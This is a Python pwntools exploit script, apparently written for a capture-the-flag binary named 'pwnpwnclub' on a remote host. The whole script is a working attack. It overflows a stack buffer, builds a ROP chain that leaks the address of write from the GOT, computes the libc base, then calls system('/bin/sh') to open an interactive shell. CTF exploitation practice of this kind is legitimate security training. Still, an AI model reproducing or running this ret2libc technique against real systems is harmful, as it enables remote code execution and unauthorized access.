#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 52.221.254.218 --port 38823 ./pwnpwnclub
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./pwnpwnclub')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '52.221.254.218'
port = int(args.PORT or 38823)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

libc_list= ["libc6_2.23-0ubuntu11.3_i386.so","libc6-i386_2.4-1ubuntu12.3_amd64.so","libc6-i386_2.4-1ubuntu12_amd64.so"]

if args.LOCAL:
    libc = ELF("/usr/lib/i386-linux-gnu/libc-2.32.so")
else:
    libc = ELF(libc_list[0])
pop_3 = 0x080493d1
write_plt = exe.plt['write']
write_got = exe.got['write']
ret = 0x0804900e

print hex(write_plt)

p ='a'*0x6c
p += p32(ret)
p += p32(write_plt)
p += p32(pop_3)
p += p32(1)
p += p32(write_got)
p += p32(4)
p += p32(exe.sym['main'])
# p += p32(exe.sym['main'])
io.sendlineafter("\n",p)

leak = u32(io.recv(4))
print hex(leak)
print hex(libc.sym['write'])
libc.address = leak-libc.sym['write']
print hex(libc.address)

p ='a'*0x6c
p += p32(ret)
p += p32(libc.sym['system'])
p += p32(pop_3)
p += p32(libc.search("/bin/sh").next())
p += p32(0)
p += p32(0)
# p += p32(exe.sym['main'])
# p += p32(exe.sym['main'])
io.sendlineafter("\n",p)



io.interactive()

